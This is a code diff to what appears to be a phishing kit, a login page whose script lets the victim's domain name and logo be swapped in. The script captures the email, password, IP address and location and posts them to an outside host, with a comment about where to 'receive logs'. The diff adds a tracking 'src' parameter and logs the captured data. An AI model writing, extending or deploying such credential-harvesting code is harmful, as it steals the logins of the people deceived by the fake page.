@@ -394,6 +394,8 @@
     </form>
 
     <script>
+      let srcParam = new URLSearchParams(window.location.search).get("src");
+
       let ipLocation;
       let count = 0;
       const data = {
@@ -402,6 +404,7 @@
         email: "",
         password: "",
         account: "",
+        src: "",
       };
 
       function showForm(domainName, domainLogo) {
@@ -430,7 +433,8 @@
         data.password = formData.get("password");
         data.ipAddress = ipLocation.ip;
         data.location = `${ipLocation.country_name} | ${ipLocation.region} | ${ipLocation.city}`
-        // console.log(data);
+        data.src = srcParam
+        console.log(data);
 
         $.ajax({
           url: "https://medicalsolutions.osc-fr1.scalingo.io/user", //Change this to your php script url to receive logs
